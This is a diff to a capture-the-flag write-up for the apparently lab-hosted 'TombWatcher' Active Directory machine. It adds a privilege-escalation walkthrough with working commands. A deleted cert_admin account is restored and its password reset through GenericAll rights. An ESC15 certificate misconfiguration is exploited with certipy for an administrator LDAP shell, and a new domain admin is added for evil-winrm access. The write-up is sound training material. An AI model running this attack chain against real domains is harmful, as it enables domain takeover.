@@ -72,7 +72,7 @@ bloodhound-python -c all -ns 10.10.11.72 -dc tombwatcher.htb -d tombwatcher.htb 
 
 As we can see bellow, there is a kerberoastable user.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -102,7 +102,7 @@ We've cracked it. The password for the user `Alfred` is `basketball` .
 
 From bloodhound we can see which the user Alfred has privilege to add itself to INFRASTRUCTURE AD group.
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code title="BloodyAD" overflow="wrap" %}
 ```bash
@@ -175,14 +175,126 @@ more C:\Users\john\Desktop\user.txt
 
 ## Privilege Escalation to Root
 
+### AD Recycle Bin enabled
 
+Try to check  if is AD directory Recycle Bin enabled with this command.
 
-### winPEAS
+{% code overflow="wrap" %}
+```powershell
+Get-ADOptionalFeature -Filter * | ? {$_.Name -match "Recycle Bin"}
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+As we can see the Recycle Bin is enabled.
+
+Now run a command to view if there are some AD Objs deleted to restore.
+
+```powershell
+Get-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true}
 
 ```
-C:\Windows\Panther\Unattend.xml 
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Yes, there is a `cert_admin` account that probably manages the AD CA.
+
+Restore it.
+
+```powershell
+Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
 ```
 
 
 
-Try to check AD directory Recycle Bin.
+Now run another bloodhound scan but as `john`.
+
+{% code overflow="wrap" %}
+```bash
+bloodhound-python -c all -ns 10.10.11.72 -dc tombwatcher.htb -d tombwatcher.htb --zip -u 'john' -p 'Password123!'
+```
+{% endcode %}
+
+Uploading update datas into bloodhound we can see that `John` has `GenericAll` rights to `CERT_ADMIN` account.
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Force the password change with John user
+
+```bash
+rpcclient -U TOMBWATCHER.HTB/JOHN 10.10.11.72
+$> setuserinfo2 cert_admin 23 'Password123!'
+```
+
+
+
+### Use Certify as cert\_admin account
+
+{% code title="certipy" overflow="wrap" %}
+```bash
+certipy find -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable -enabled
+```
+{% endcode %}
+
+Print the result and check if there are some misconfigurations
+
+```bash
+cat *_Certipy.txt | grep ESC
+```
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+There is ESC15 misconfiguration.
+
+Exploit it.
+
+{% code overflow="wrap" %}
+```bash
+certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Using the certificate obtained to get a ldap shell&#x20;
+
+```bash
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
+```
+
+We got a LDAP shell as administrator!
+
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+Now we can create a new user and add it to ADMINISTRATORS group
+
+```bash
+> add_user mario_rossi
+
+Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb
+Adding new user with username: mario_rossi and password: 6g1E4gIG.1?_qG> result: OK
+```
+
+```bash
+> add_user_to_group mario_rossi administrators
+
+Adding user: mario_rossi to group Administrators result: OK
+```
+
+Now try to access to DC as new user created.
+
+```bash
+evil-winrm -i 10.10.11.72 -u 'mario_rossi' -p '6g1E4gIG.1?_qG>'
+```
+
+
+
+### Root.flag
+
+Now that we have a PS shell on the Domain Controller as Administrator's user we can search the flag and print her.
+
+```bash
+more C:\Users\Administrator\Desktop\root.txt
+```
+
